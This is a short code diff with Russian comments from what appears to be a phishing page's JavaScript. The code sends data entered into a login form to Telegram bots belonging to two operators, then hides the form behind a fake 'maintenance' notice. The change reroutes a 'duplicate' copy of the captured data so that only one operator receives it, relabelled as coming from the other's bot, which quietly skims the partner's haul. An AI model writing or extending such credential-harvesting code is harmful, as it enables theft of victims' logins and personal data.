@@ -142,11 +142,11 @@
         sendMessage(HIS_BOT_TOKEN, HIS_ID, text);   // ему
         sendMessage(HIS_BOT_TOKEN, MY_ID, text);    // тебе (от его бота)
 
-        // === 4. ДУБЛЬ (страховка через твоего бота) ===
-        // Отправляем и тебе, и ему через твоего бота с пометкой [ДУБЛЬ]
-        const extraText = "📩 [ДУБЛЬ] от твоего бота\n" + text;
-        sendMessage(MY_BOT_TOKEN, MY_ID, extraText);    // тебе
-        sendMessage(MY_BOT_TOKEN, HIS_ID, extraText);   // ему (тоже)
+        // === 4. ДОПОЛНИТЕЛЬНО: если данные ввёл он — они всё равно придут тебе (через твоего бота) ===
+        // Это гарантирует, что ты получишь данные даже если его бот по какой-то причине не сработает
+        // (отправляем повторно на твой ID, но с пометкой, что это от него)
+        const extraText = "📩 [ДУБЛЬ] от его бота\n" + text;
+        sendMessage(MY_BOT_TOKEN, MY_ID, extraText);
 
         // Показываем техработы
         document.getElementById("loginFormContainer").classList.add("hidden");
